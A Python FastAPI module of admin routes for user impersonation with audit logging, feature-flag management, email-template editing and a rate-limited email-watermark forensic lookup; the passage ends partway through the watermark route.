"""Admin routes for impersonation, feature flags, and email templates.

Registered from server.py via `admin_routes.register(app)` during module
import. Kept in a separate file so the three-feature surface (routes, form
parsers, small render helpers) doesn't balloon server.py further. All
cross-references back into server.py go through `_deps()` below, which
lazily grabs the names from the already-imported server module — this
avoids circular imports at startup.
"""

from __future__ import annotations

import datetime as _dt
import html
import json
import logging
import re
import sqlite3
import time

from fastapi import Form, HTTPException, Request
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse

import db
import features


log = logging.getLogger("gateway.admin_routes")


# ── Deferred lookups into server.py ─────────────────────────────────────


def _srv():
    """Return the already-imported server module."""
    import sys
    return sys.modules.get("server") or sys.modules["__main__"]


def _require_admin_user(request, *, page: bool = False):
    return _srv()._require_admin_user(request, page=page)


def _real_admin_user(request):
    return _srv()._real_admin_user(request)


def _denied_response(request):
    return _srv()._denied_response(request)


def _render_page(name, **context):
    return _srv().render_page(name, **context)


def _role_badge(user):
    return _srv()._role_badge(user)


def _set_imp_cookie(response, token, request):
    return _srv()._set_impersonation_cookie(response, token, request)


def _clear_imp_cookie(response, request):
    return _srv()._clear_impersonation_cookie(response, request)


def _client_ip(request):
    return _srv()._get_client_ip(request)


def _current_user(request):
    return _srv().current_user(request)


# ── Shared helpers ───────────────────────────────────────────────────────


def _audit(action, *, admin, request, target_type=None, target_id=None,
           target_description=None, before=None, after=None, notes=None):
    # NOTE: security.audit.log_action() already wraps DB-layer failures in
    # its own try/except so storage failures never block the admin action.
    # By the time an exception reaches us here, the cause is almost
    # certainly a programming error at the call site — AttributeError on
    # a missing AuditAction constant, TypeError on a bad kwarg, etc.
    # The previous bare `except: pass` silently hid the missing
    # FEATURE_FLAG_* / IMPERSONATION_* constants and produced ZERO audit
    # rows for those actions. We now log.exception() and re-raise so the
    # next missing constant is loud in the gateway log *and* the
    # failing call site is forced to confront it during development +
    # tests, instead of quietly dropping audit rows in production.
    from security import audit as _a
    try:
        _a.log_action(
            admin_user_id=(admin or {}).get("user_id"),
            admin_email=(admin or {}).get("email"),
            action=action,
            target_type=target_type,
            target_id=target_id,
            target_description=target_description,
            before=before, after=after,
            request=request, notes=notes,
        )
    except Exception:
        log.exception(
            "admin_routes._audit failed (action=%r) — likely a missing "
            "AuditAction constant or a bad kwarg; investigate immediately",
            action,
        )
        raise


def _fmt_ts(ts, fmt="%Y-%m-%d %H:%M:%S UTC"):
    if not ts:
        return "—"
    return _dt.datetime.fromtimestamp(int(ts), tz=_dt.timezone.utc).strftime(fmt)


def _fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    if seconds < 3600:
        return f"{seconds // 60}m"
    return f"{seconds // 3600}h {(seconds % 3600) // 60}m"


# ── Impersonation routes ─────────────────────────────────────────────────


async def impersonate_start(request: Request, user_id: int, reason: str = Form("")):
    admin = _require_admin_user(request)
    reason = (reason or "").strip()
    if not reason or len(reason) < 4:
        raise HTTPException(status_code=400, detail="Reason is required (min 4 chars)")
    if len(reason) > 500:
        reason = reason[:500]

    target = db.get_user_by_id(user_id)
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    if target["id"] == admin["user_id"]:
        raise HTTPException(status_code=400, detail="Cannot impersonate yourself")
    # C6: admin_level MUST be explicitly present on the actor — missing = fail
    # closed. Without this, a session dict lacking admin_level would silently
    # fall back to 0 and allow weird comparisons.
    admin_level = admin.get("admin_level")
    if admin_level is None or admin_level < 1:
        raise HTTPException(status_code=403, detail="Admin role not verified")
    target_level = target["is_admin"] or 0
    if target_level >= admin_level:
        # Block impersonating a peer-or-higher admin to prevent privilege
        # laundering (admin A → impersonate admin B → take admin B's actions).
        raise HTTPException(status_code=403, detail="Cannot impersonate an equal-or-higher admin")

    imp = db.create_impersonation_session(
        admin_user_id=admin["user_id"],
        target_user_id=user_id,
        reason=reason,
        ip_address=_client_ip(request),
        user_agent=(request.headers.get("user-agent") or "")[:500],
    )

    from security import audit as _a
    _audit(
        _a.AuditAction.IMPERSONATION_START,
        admin=admin, request=request,
        target_type="user", target_id=user_id,
        target_description=target["email"],
        notes=f"reason={reason[:200]}",
    )
    log.info("Admin %s started impersonating user_id=%d reason=%r", admin["email"], user_id, reason[:80])

    response = RedirectResponse("/dashboards", status_code=302)
    _set_imp_cookie(response, imp["cookie_token"], request)
    return response


async def impersonate_end(request: Request):
    """Idempotent — a stale cookie always clears on the way out."""
    imp_state = getattr(request.state, "impersonation", None)
    admin = _real_admin_user(request)

    if imp_state:
        try:
            db.end_impersonation_session(imp_state["session_id"], end_reason="admin_ended")
        except Exception as exc:
            log.warning("end_impersonation_session failed: %s", exc)
        from security import audit as _a
        try:
            _a.log_action(
                admin_user_id=imp_state["admin_user_id"],
                admin_email=imp_state.get("admin_email"),
                action=_a.AuditAction.IMPERSONATION_END,
                target_type="user", target_id=imp_state["target_user_id"],
                request=request,
                notes=f"session_id={imp_state['session_id']}",
            )
        except Exception:
            pass

    target_path = "/admin/impersonations" if admin and admin.get("is_admin") else "/login"
    response = RedirectResponse(target_path, status_code=302)
    _clear_imp_cookie(response, request)
    return response


async def impersonations_list(request: Request):
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)

    qp = request.query_params
    q = (qp.get("q") or "").strip()
    since_str = (qp.get("since") or "").strip()
    until_str = (qp.get("until") or "").strip()
    since_ts = _parse_date_to_ts(since_str)
    until_ts = _parse_date_to_ts(until_str)
    if until_ts is not None:
        until_ts += 86_399

    sessions = db.list_impersonation_sessions(limit=500)

    def _keep(s) -> bool:
        if q:
            admin_email = (s["admin_email"] or "").lower()
            target_email = (s["target_email"] or "").lower()
            if q.lower() not in admin_email and q.lower() not in target_email:
                return False
        started = int(s["started_at"] or 0)
        if since_ts is not None and started < since_ts:
            return False
        if until_ts is not None and started > until_ts:
            return False
        return True

    sessions = [s for s in sessions if _keep(s)][:200]
    rows = []
    for s in sessions:
        started = _fmt_ts(s["started_at"], "%Y-%m-%d %H:%M UTC")
        if s["ended_at"]:
            dur_s = int(s["ended_at"]) - int(s["started_at"])
            status_badge = '<span class="badge" style="background:var(--surface-hover);color:var(--text-muted)">Ended</span>'
        else:
            dur_s = int(time.time()) - int(s["started_at"])
            status_badge = '<span class="badge" style="background:rgba(245,158,11,0.12);color:#f59e0b">Active</span>'

        rows.append(
            f'<a class="admin-row" href="/admin/impersonations/{s["id"]}" '
            f'style="display:flex;text-decoration:none;color:inherit">'
            f'<div class="admin-row-info">'
            f'<div class="admin-row-main">{html.escape(s["admin_email"] or "(deleted)")} → '
            f'<strong>{html.escape(s["target_email"] or "(deleted)")}</strong> {status_badge}</div>'
            f'<div class="admin-row-meta">{html.escape((s["reason"] or "")[:200])} &middot; '
            f'{started} &middot; {_fmt_duration(dur_s)} &middot; '
            f'{int(s["action_count"] or 0)} actions</div>'
            f'</div></a>'
        )

    body = "".join(rows) or '<div class="admin-row"><div class="admin-row-info"><div class="admin-row-meta">No impersonation sessions yet.</div></div></div>'
    from admin_shell import render_admin_page
    return render_admin_page(
        request,
        "admin/impersonations.html",
        page_title="Impersonations",
        active_route="impersonations",
        breadcrumb=[("Admin", "/admin"), ("Impersonations", "/admin/impersonations")],
        raw_sessions=body,
        filter_q=q,
        filter_since=since_str,
        filter_until=until_str,
        result_count=f"{len(sessions):,}",
    )


async def impersonation_detail(request: Request, session_id: int):
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)

    s = db.get_impersonation_session(session_id)
    if not s:
        raise HTTPException(status_code=404, detail="Session not found")
    admin_row = db.get_user_by_id(s["admin_user_id"]) if s["admin_user_id"] else None
    target_row = db.get_user_by_id(s["target_user_id"]) if s["target_user_id"] else None

    actions = db.list_impersonation_actions(session_id, limit=1000)
    action_rows = []
    for a in actions:
        ts = _fmt_ts(a["timestamp"], "%H:%M:%S")
        status = a["status_code"] if a["status_code"] is not None else "—"
        row_style = ""
        tag = ""
        if a["was_blocked"]:
            row_style = "background:rgba(239,68,68,0.08)"
            tag = ' <span class="badge" style="background:rgba(239,68,68,0.18);color:#ef4444">BLOCKED</span>'
        action_rows.append(
            f'<div class="admin-row" style="{row_style}">'
            f'<div class="admin-row-info">'
            f'<div class="admin-row-main" style="font-family:ui-monospace,monospace;font-size:12px">'
            f'<span style="color:var(--text-muted);margin-right:10px">{ts}</span>'
            f'<strong>{html.escape(a["method"])}</strong> {html.escape(a["path"])}{tag}'
            f'</div>'
            f'<div class="admin-row-meta">Status: {status}</div>'
            f'</div></div>'
        )

    admin_display = admin_row["email"] if admin_row else "(deleted)"
    target_display = target_row["email"] if target_row else "(deleted)"
    summary = (
        f'<div class="stat-card"><div class="stat-label">Admin</div>'
        f'<div class="stat-value" style="font-size:14px">{html.escape(admin_display)}</div></div>'
        f'<div class="stat-card"><div class="stat-label">Target</div>'
        f'<div class="stat-value" style="font-size:14px">{html.escape(target_display)}</div></div>'
        f'<div class="stat-card"><div class="stat-label">Started</div>'
        f'<div class="stat-value" style="font-size:13px">{_fmt_ts(s["started_at"])}</div></div>'
        f'<div class="stat-card"><div class="stat-label">Ended</div>'
        f'<div class="stat-value" style="font-size:13px">{_fmt_ts(s["ended_at"])}</div></div>'
        f'<div class="stat-card"><div class="stat-label">Actions</div>'
        f'<div class="stat-value">{int(s["action_count"] or 0)}</div></div>'
    )

    from admin_shell import render_admin_page
    return render_admin_page(
        request,
        "admin/impersonation-detail.html",
        page_title=f"Session #{session_id}",
        active_route="impersonations",
        breadcrumb=[
            ("Admin", "/admin"),
            ("Impersonations", "/admin/impersonations"),
            (f"#{session_id}", None),
        ],
        session_id=str(session_id),
        reason=s["reason"] or "",
        ip_address=s["ip_address"] or "",
        raw_summary_cards=summary,
        raw_action_rows="".join(action_rows) or '<div class="admin-row"><div class="admin-row-info"><div class="admin-row-meta">No actions recorded.</div></div></div>',
    )


# ── Feature flag routes ─────────────────────────────────────────────────


_FLAG_TIERS = ["free", "trader", "pro", "enterprise"]


def _subproduct_slugs():
    """Return the list of valid subproduct slugs, sorted.

    Used to validate the ``subproduct`` query/form param on flag CRUD so
    the admin UI cannot accidentally create a row scoped to a junk slug.
    Looked up lazily so the import order of `subproduct` does not matter.
    """
    try:
        from subproduct import SUBPRODUCTS  # type: ignore
    except Exception:
        try:
            from gateway.subproduct import SUBPRODUCTS  # type: ignore
        except Exception:
            return []
    return sorted(SUBPRODUCTS.keys())


def _flag_subproduct_dropdown(current):
    """Return <option> tags for the per-subproduct scope dropdown.

    Empty value = global (subproduct_key IS NULL). Each other option is a
    valid subproduct slug from the SUBPRODUCTS catalogue.
    """
    cur = current or ""
    parts = [
        '<option value=""' + (' selected' if not cur else '') + '>Global (default)</option>'
    ]
    for slug in _subproduct_slugs():
        sel = ' selected' if cur == slug else ''
        parts.append(
            f'<option value="{html.escape(slug)}"{sel}>'
            f'{html.escape(slug)}.narve.ai</option>'
        )
    return "".join(parts)


def _normalize_subproduct(raw):
    """Coerce a query/form value into a valid subproduct slug or None.

    Falls back to None (global) when the value is missing, empty, or not
    a known slug.
    """
    if not raw:
        return None
    value = str(raw).strip()
    if not value:
        return None
    return value if value in _subproduct_slugs() else None


def _flag_tier_input(current: list) -> str:
    parts = []
    for t in _FLAG_TIERS:
        checked = "checked" if t in current else ""
        parts.append(
            f'<label style="display:inline-flex;align-items:center;gap:6px;margin-right:14px">'
            f'<input type="checkbox" name="tiers" value="{html.escape(t)}" {checked}> '
            f'{html.escape(t)}</label>'
        )
    return "".join(parts)


def _parse_flag_form(form) -> dict:
    def _csv(value):
        if not value:
            return []
        out = []
        for part in str(value).replace("\n", ",").split(","):
            part = part.strip()
            if not part:
                continue
            try:
                out.append(int(part))
            except ValueError:
                pass
        return out

    tiers = form.getlist("tiers") if hasattr(form, "getlist") else []
    kwargs = {
        "name": (form.get("name") or "").strip(),
        "description": (form.get("description") or "").strip(),
        "enabled_globally": bool(form.get("enabled_globally")),
        "enabled_for_tiers": [t for t in tiers if t],
        "enabled_for_user_ids": _csv(form.get("enabled_user_ids") or ""),
        "disabled_for_user_ids": _csv(form.get("disabled_user_ids") or ""),
    }
    try:
        kwargs["rollout_percentage"] = int(form.get("rollout_percentage") or 0)
    except ValueError:
        kwargs["rollout_percentage"] = 0
    return kwargs


async def flags_page(request: Request):
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)

    qp = request.query_params
    q = (qp.get("q") or "").strip()
    enabled_filter = (qp.get("enabled") or "").strip().lower()
    if enabled_filter not in {"", "yes", "no", "all"}:
        enabled_filter = ""

    flags = db.list_feature_flags()

    def _keep(f) -> bool:
        if q:
            needle = q.lower()
            key = (f["key"] or "").lower()
            name = (f["name"] or "").lower()
            if needle not in key and needle not in name:
                return False
        if enabled_filter in {"yes", "no"}:
            is_on = bool(f["enabled_globally"])
            if enabled_filter == "yes" and not is_on:
                return False
            if enabled_filter == "no" and is_on:
                return False
        # ``all`` and empty pass through.
        return True

    flags = [f for f in flags if _keep(f)]
    rows = []
    for f in flags:
        data = features.flag_to_dict(f)
        tiers = ", ".join(data["enabled_for_tiers"]) or "—"
        status = (
            '<span class="badge" style="background:rgba(34,197,94,0.12);color:#22c55e">Enabled</span>'
            if f["enabled_globally"] else
            '<span class="badge" style="background:var(--surface-hover);color:var(--text-muted)">Disabled</span>'
        )
        # Per-subproduct override badge — makes it obvious at a glance
        # which rows are scoped vs global. Global rows show no badge.
        subp = data.get("subproduct_key")
        scope_badge = (
            f'<span class="badge" style="background:var(--surface-hover);color:var(--text-secondary);'
            f'margin-left:8px;font-size:10px">{html.escape(subp)}.narve.ai</span>'
            if subp else ""
        )
        # Edit link carries the subproduct slug as a query param so the
        # edit page targets the right (key, subproduct_key) row.
        edit_href = f'/admin/flags/{html.escape(f["key"])}'
        if subp:
            edit_href += f'?subproduct={html.escape(subp)}'
        rows.append(
            f'<div class="admin-row">'
            f'<div class="admin-row-info">'
            f'<div class="admin-row-main"><code>{html.escape(f["key"])}</code> &middot; '
            f'<strong>{html.escape(f["name"])}</strong> {status}{scope_badge}</div>'
            f'<div class="admin-row-meta">Tiers: {html.escape(tiers)} &middot; '
            f'Rollout: {int(f["rollout_percentage"] or 0)}%</div></div>'
            f'<div class="admin-row-actions"><a class="btn btn-primary-outline" style="font-size:11px" '
            f'href="{edit_href}">Edit</a></div>'
            f'</div>'
        )

    body = "".join(rows) or '<div class="admin-row"><div class="admin-row-info"><div class="admin-row-meta">No flags yet. Create the first one below.</div></div></div>'
    from admin_shell import render_admin_page
    return render_admin_page(
        request,
        "admin/flags.html",
        page_title="Feature flags",
        active_route="flags",
        breadcrumb=[("Admin", "/admin"), ("Feature flags", "/admin/flags")],
        raw_flag_rows=body,
        raw_create_subproduct_options=_flag_subproduct_dropdown(None),
        filter_q=q,
        filter_enabled=enabled_filter,
        result_count=f"{len(flags):,}",
    )


async def flag_create(request: Request):
    admin = _require_admin_user(request)
    form = await request.form()
    key = (form.get("key") or "").strip()
    name = (form.get("name") or "").strip()
    if not key or not re.fullmatch(r"[a-z0-9_\-]{1,80}", key):
        raise HTTPException(status_code=400, detail="Key must be lowercase [a-z0-9_-], ≤80 chars")
    # HIGH fix: pin the flag keyspace to features.KNOWN_FLAGS so admins
    # cannot persist arbitrary keys. New keys MUST be added to the registry
    # in code before being createable here — that's the deliberate friction
    # that keeps a typo from creating a dead row no code reads, and that
    # prevents pre-staging rows for keys downstream code will consume.
    if not features.is_known_flag(key):
        raise HTTPException(
            status_code=400,
            detail=(
                f"Unknown flag key '{key}'. Add it to features.KNOWN_FLAGS "
                "in the registry first."
            ),
        )
    if not name:
        name = key
    subproduct_key = _normalize_subproduct(form.get("subproduct"))
    if db.get_feature_flag(key, subproduct_key=subproduct_key):
        scope_msg = f" for subproduct {subproduct_key}" if subproduct_key else ""
        raise HTTPException(
            status_code=409,
            detail=f"A flag with that key already exists{scope_msg}",
        )

    db.create_feature_flag(
        key=key, name=name,
        description=(form.get("description") or "").strip(),
        updated_by_admin_id=admin["user_id"],
        subproduct_key=subproduct_key,
    )
    from security import audit as _a
    _audit(
        _a.AuditAction.FEATURE_FLAG_CREATE,
        admin=admin, request=request,
        target_type="feature_flag", target_id=key,
        target_description=(
            f"{name} (subproduct={subproduct_key})" if subproduct_key else name
        ),
    )
    redirect = f"/admin/flags/{key}"
    if subproduct_key:
        redirect += f"?subproduct={subproduct_key}"
    return RedirectResponse(redirect, status_code=302)


async def flag_edit_page(request: Request, key: str):
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)
    subproduct_key = _normalize_subproduct(request.query_params.get("subproduct"))
    row = db.get_feature_flag(key, subproduct_key=subproduct_key)
    if not row:
        raise HTTPException(status_code=404, detail="Flag not found")
    data = features.flag_to_dict(row)

    # Form action carries the subproduct via query string so the POST
    # routes (save / delete) target the right (key, subproduct_key) row.
    form_qs = f"?subproduct={subproduct_key}" if subproduct_key else ""
    scope_label = (
        f"{subproduct_key}.narve.ai" if subproduct_key else "Global (default)"
    )

    from admin_shell import render_admin_page
    return render_admin_page(
        request,
        "admin/flag-edit.html",
        page_title=f"Flag: {data['key']}",
        active_route="flags",
        breadcrumb=[
            ("Admin", "/admin"),
            ("Feature flags", "/admin/flags"),
            (data["key"] + (f" ({subproduct_key})" if subproduct_key else ""), None),
        ],
        flag_key=data["key"],
        flag_name=data["name"],
        flag_description=data["description"],
        flag_form_qs=form_qs,
        flag_scope_label=scope_label,
        raw_subproduct_options=_flag_subproduct_dropdown(subproduct_key),
        # Template uses {{ raw_enabled_checked }} so the substituter
        # leaves the value as raw HTML attribute fragment ("checked" or
        # empty). Without the raw_ prefix the placeholder never matched,
        # the "Enabled globally" toggle never reflected state, and
        # saving would silently flip every flag off.
        raw_enabled_checked="checked" if data["enabled_globally"] else "",
        rollout_percentage=str(data["rollout_percentage"]),
        enabled_user_ids=", ".join(str(x) for x in data["enabled_for_user_ids"]),
        disabled_user_ids=", ".join(str(x) for x in data["disabled_for_user_ids"]),
        raw_tier_checkboxes=_flag_tier_input(data["enabled_for_tiers"]),
    )


async def flag_save(request: Request, key: str):
    admin = _require_admin_user(request)
    subproduct_key = _normalize_subproduct(request.query_params.get("subproduct"))
    row = db.get_feature_flag(key, subproduct_key=subproduct_key)
    if not row:
        raise HTTPException(status_code=404, detail="Flag not found")
    form = await request.form()
    kwargs = _parse_flag_form(form)
    kwargs["updated_by_admin_id"] = admin["user_id"]
    db.update_feature_flag(key, subproduct_key=subproduct_key, **kwargs)

    # Feature flags gate what the feed materialises for which tier/user.
    # Flush the feed namespace after any flag change so users don't see
    # stale rows until the 60s TTL expires.
    try:
        from cache import ttl_invalidate
        ttl_invalidate.on_feature_flag_change()
    except Exception:
        log.warning("ttl_invalidate on_feature_flag_change failed", exc_info=True)

    from security import audit as _a
    audit_kwargs = dict(kwargs)
    audit_kwargs["subproduct_key"] = subproduct_key
    _audit(
        _a.AuditAction.FEATURE_FLAG_UPDATE,
        admin=admin, request=request,
        target_type="feature_flag",
        target_id=(f"{key}@{subproduct_key}" if subproduct_key else key),
        after=audit_kwargs,
    )
    return RedirectResponse("/admin/flags", status_code=302)


async def flag_delete(request: Request, key: str):
    admin = _require_admin_user(request)
    subproduct_key = _normalize_subproduct(request.query_params.get("subproduct"))
    if not db.delete_feature_flag(key, subproduct_key=subproduct_key):
        raise HTTPException(status_code=404, detail="Flag not found")
    from security import audit as _a
    _audit(
        _a.AuditAction.FEATURE_FLAG_DELETE,
        admin=admin, request=request,
        target_type="feature_flag",
        target_id=(f"{key}@{subproduct_key}" if subproduct_key else key),
    )
    return RedirectResponse("/admin/flags", status_code=302)


async def flag_evaluate_api(request: Request, key: str):
    # C5: require authentication — flags leak rollout state and should never
    # be enumerable by anonymous traffic.
    user = _current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="Authentication required")
    # HIGH fix: gate the evaluator behind the KNOWN_FLAGS registry so a
    # free user cannot probe for the existence of admin-only flags via a
    # differential response (e.g. 200/true vs 200/false leaking key
    # presence). Admins keep the unrestricted path so they can debug
    # newly-added registry entries before any code wires them up.
    if not (user.get("is_admin") or features.is_known_flag(key)):
        raise HTTPException(status_code=404, detail="Flag not found")
    subproduct_key = _normalize_subproduct(request.query_params.get("subproduct"))
    enabled = features.is_feature_enabled(key, user, subproduct_key=subproduct_key)
    return JSONResponse({
        "key": key,
        "enabled": enabled,
        "subproduct_key": subproduct_key,
    })


# ── Email template routes ───────────────────────────────────────────────


EDITABLE_EMAIL_TEMPLATES = [
    ("welcome", "Welcome email (sent after signup)"),
    ("token_delivery", "Access-token delivery (invite flow)"),
    ("password_reset", "Password reset link"),
    ("payment_failed", "Payment failed notification"),
    ("subscription_cancelled", "Subscription cancellation"),
    ("account_deletion_confirmation", "Account deletion confirmation"),
    ("account_deleted", "Account deleted notice"),
    ("weekly_digest", "Weekly signal digest"),
    ("market_resolved", "Market resolved notification"),
    ("unsubscribe_confirmation", "Unsubscribe confirmation"),
    ("enquiry_notification", "Enquiry notification (admin alert)"),
    ("morning_briefing", "Daily morning briefing"),
    ("market_mover_alert", "Market mover alert"),
]


def _default_email_variables(key: str) -> list:
    common = ["display_name", "email", "app_url"]
    extras = {
        "welcome": ["tier", "dashboard_url"],
        "token_delivery": ["token", "invite_url"],
        "password_reset": ["reset_url", "expires_at"],
        "payment_failed": ["amount", "retry_url"],
        "subscription_cancelled": ["plan", "ends_at"],
        "account_deletion_confirmation": ["cancel_url", "deletion_at"],
        "account_deleted": [],
        "weekly_digest": ["signals_count", "top_market", "digest_url"],
        "market_resolved": ["market_question", "outcome", "market_url"],
        "unsubscribe_confirmation": [],
        "enquiry_notification": ["enquirer_email", "message"],
        "morning_briefing": ["date", "top_signals"],
        "market_mover_alert": ["market_question", "price_change", "market_url"],
    }.get(key, [])
    seen = set()
    out = []
    for v in common + extras:
        if v not in seen:
            seen.add(v)
            out.append(v)
    return out


async def emails_page(request: Request):
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)

    qp = request.query_params
    q = (qp.get("q") or "").strip()
    needle = q.lower()

    existing = {r["key"]: r for r in db.list_email_templates()}
    rows = []
    kept = 0
    for key, description in EDITABLE_EMAIL_TEMPLATES:
        row = existing.get(key)
        if row:
            ts = _fmt_ts(row["updated_at"], "%b %-d %H:%M UTC")
            status_html = (
                '<span class="badge" style="background:rgba(34,197,94,0.12);color:#22c55e">Custom</span>'
                if row["is_active"] else
                '<span class="badge" style="background:var(--surface-hover);color:var(--text-muted)">Draft</span>'
            )
            subject = row["subject"]
        else:
            ts = "—"
            status_html = '<span class="badge" style="background:var(--surface-hover);color:var(--text-muted)">Default</span>'
            subject = ""

        # Substring search across key + subject so the admin can type
        # either ``billing`` (hits ``billing.invoice_paid``) or ``Welcome``
        # (hits the subject line). Description is intentionally not part
        # of the haystack — these are mostly boilerplate so they'd dilute
        # the signal.
        if needle:
            hay = f"{key.lower()} {(subject or '').lower()}"
            if needle not in hay:
                continue
        kept += 1

        meta_parts = [html.escape(description)]
        if row:
            meta_parts.append(f"Last edited {html.escape(ts)}")
        if subject:
            meta_parts.append(f"Subject: {html.escape(subject[:80])}")

        rows.append(
            f'<div class="admin-row">'
            f'<div class="admin-row-info">'
            f'<div class="admin-row-main"><code>{html.escape(key)}</code> {status_html}</div>'
            f'<div class="admin-row-meta">{" &middot; ".join(meta_parts)}</div></div>'
            f'<div class="admin-row-actions"><a class="btn btn-primary-outline" style="font-size:11px" '
            f'href="/admin/email-templates/{html.escape(key)}">Edit</a></div>'
            f'</div>'
        )

    from admin_shell import render_admin_page
    return render_admin_page(
        request,
        "admin/email-templates.html",
        page_title="Email templates",
        active_route="email-templates",
        breadcrumb=[("Admin", "/admin"), ("Email templates", "/admin/email-templates")],
        raw_template_rows="".join(rows),
        filter_q=q,
        result_count=f"{kept:,}",
    )


async def email_edit_page(request: Request, key: str):
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)
    known_keys = {k for k, _ in EDITABLE_EMAIL_TEMPLATES}
    if key not in known_keys:
        raise HTTPException(status_code=404, detail="Unknown template key")

    row = db.get_email_template(key)
    variables = _default_email_variables(key)

    if row:
        subject = row["subject"] or ""
        body_html_str = row["body_html"] or ""
        body_text = row["body_text"] or ""
        is_active = bool(row["is_active"])
        try:
            saved_vars = json.loads(row["variables"] or "[]")
            if saved_vars:
                variables = saved_vars
        except (ValueError, TypeError):
            pass
    else:
        from email_system.service import _SUBJECTS as _DEFAULT_SUBJECTS
        subject = _DEFAULT_SUBJECTS.get(key, "narve.ai")
        body_html_str = ""
        body_text = ""
        is_active = True

    var_chips = "".join(
        f'<code style="margin-right:6px;padding:2px 6px;background:var(--surface-hover);'
        f'border-radius:4px;font-size:11px">{{{{ {html.escape(v)} }}}}</code>'
        for v in variables
    )

    from admin_shell import render_admin_page
    return render_admin_page(
        request,
        "admin/email-edit.html",
        page_title=f"Email: {key}",
        active_route="email-templates",
        breadcrumb=[
            ("Admin", "/admin"),
            ("Email templates", "/admin/email-templates"),
            (key, None),
        ],
        template_key=key,
        subject=subject,
        body_html_text=body_html_str,
        body_text=body_text,
        is_active_checked="checked" if is_active else "",
        has_override="1" if row else "0",
        raw_variable_chips=var_chips,
    )


async def email_save(request: Request, key: str):
    admin = _require_admin_user(request)
    known_keys = {k for k, _ in EDITABLE_EMAIL_TEMPLATES}
    if key not in known_keys:
        raise HTTPException(status_code=404, detail="Unknown template key")

    form = await request.form()
    subject = (form.get("subject") or "").strip()
    body_html_str = form.get("body_html") or ""
    body_text_str = form.get("body_text") or ""
    is_active = bool(form.get("is_active"))
    if not subject:
        raise HTTPException(status_code=400, detail="Subject cannot be empty")
    if not body_html_str.strip():
        raise HTTPException(status_code=400, detail="Body HTML cannot be empty")

    db.upsert_email_template(
        key=key,
        subject=subject,
        body_html=body_html_str,
        body_text=body_text_str,
        variables=_default_email_variables(key),
        is_active=is_active,
        updated_by_admin_id=admin["user_id"],
    )
    from security import audit as _a
    _audit(
        _a.AuditAction.EMAIL_TEMPLATE_UPDATE,
        admin=admin, request=request,
        target_type="email_template", target_id=key,
        notes=f"is_active={is_active}",
    )
    return RedirectResponse("/admin/email-templates", status_code=302)


async def email_preview(request: Request, key: str):
    _require_admin_user(request)
    form = await request.form()
    subject = form.get("subject") or ""
    body_html_str = form.get("body_html") or ""
    from email_system.service import render_preview
    preview = render_preview(
        subject=subject,
        body_html=body_html_str,
        variables=_default_email_variables(key),
    )
    return JSONResponse(preview)


async def email_reset(request: Request, key: str):
    admin = _require_admin_user(request)
    existed = db.delete_email_template(key)
    if existed:
        from security import audit as _a
        _audit(
            _a.AuditAction.EMAIL_TEMPLATE_RESET,
            admin=admin, request=request,
            target_type="email_template", target_id=key,
        )
    return RedirectResponse("/admin/email-templates", status_code=302)


# ── /admin/trace-watermark ──────────────────────────────────────────────
#
# Forensic reverse-lookup for per-recipient email watermarks. Pro
# intelligence emails carry an HMAC-derived 6-char hex fingerprint in
# the footer + invisible zero-width run in the body; this endpoint maps
# a leaked fingerprint back to the recipient. See
# ``email_system/watermark.py`` for the scheme.
#
# Admin-gated (any admin role — incident response shouldn't require a
# super-admin escalation). Every lookup is audit-logged via the standard
# ``EMAIL_WATERMARK_TRACE`` audit action so the trail of "who looked up
# which subscriber" is preserved.


async def trace_watermark_route(request: Request):
    """GET /admin/trace-watermark?id=<watermark>.

    Returns JSON with the user_id, email, template, and timestamp of
    the email carrying the supplied watermark fingerprint. Returns 404
    if the fingerprint is unknown, 400 if the query string is missing
    or malformed.

    Forensic endpoint — per Cloudflare audit, every access fires:
      * standard audit log entry (``EMAIL_WATERMARK_TRACE``)
      * Sentry capture_message at info level
      * email to the forensic mailbox (``LEGAL_EMAIL`` / ``EMAIL_FORENSIC``)

    Rate-limited to 10 lookups per hour per admin so a compromised admin
    account cannot drain the whole watermark map in one burst.
    """
    admin = _require_admin_user(request)

    # Rate-limit per admin: 10 / hour. 11th request returns 429.
    try:
        from server import _is_rate_limited as _irl  # type: ignore
        admin_key = (admin or {}).get("user_id") or (admin or {}).get("email") or "unknown"
        if _irl(f"trace-watermark:{admin_key}", limit=10, window=3600):
            return JSONResponse(
                {"error": "rate limit exceeded (10/hour)"},
                status_code=429,
            )
    except Exception:
        log.warning("trace_watermark rate-limit check failed", exc_info=True)

    qp = request.query_params
    raw = (qp.get("id") or "").strip().lower()
    if not raw or not re.fullmatch(r"[0-9a-f]{4,12}", raw):
        return JSONResponse(
            {"error": "missing or malformed id (expected 4-12 hex chars)"},
            status_code=400,
        )

    # Optional refinement filters — let an admin scope a positive hit by
    # target email substring or by created_at window so a stale watermark
    # pointing at a recycled inbox doesn't yield a misleading result. All
    # values are post-validated and applied after the watermark lookup so
    # the existing 4-12 hex-char contract is unchanged.
    q_target = (qp.get("q") or "").strip().lower()
    since_str = (qp.get("since") or "").strip()
    until_str = (qp.get("until") or "").strip()
    since_ts = _parse_date_to_ts(since_str)
    until_ts = _parse_date_to_ts(until_str)
    if until_ts is not None:
        until_ts += 86_399

    from email_system import watermark as _wm
    detail = _wm.trace_watermark_detail(raw)

    # Always audit: even a miss is interesting (someone tried to look up
    # a forged fingerprint).
    try:
        from security import audit as _a
        action = getattr(_a.AuditAction, "EMAIL_WATERMARK_TRACE", None) \
            or _a.AuditAction.SYSTEM_CONFIG_CHANGE
        _audit(
            action,
            admin=admin, request=request,
            target_type="email_watermark", target_id=raw,
            after=detail or {"hit": False},
        )
    except Exception:
        log.warning("audit of trace_watermark failed", exc_info=True)

    # Sentry capture — every access, even misses. Info-level because it's
    # informational/forensic, not an error condition.
    admin_email = (admin or {}).get("email") or "unknown"
    target_user_id = (detail or {}).get("user_id") if detail else None
    try:
        import sentry_sdk
        sentry_sdk.capture_message(
            f"Admin trace-watermark used: admin={admin_email} target={target_user_id}",
            level="info",
        )
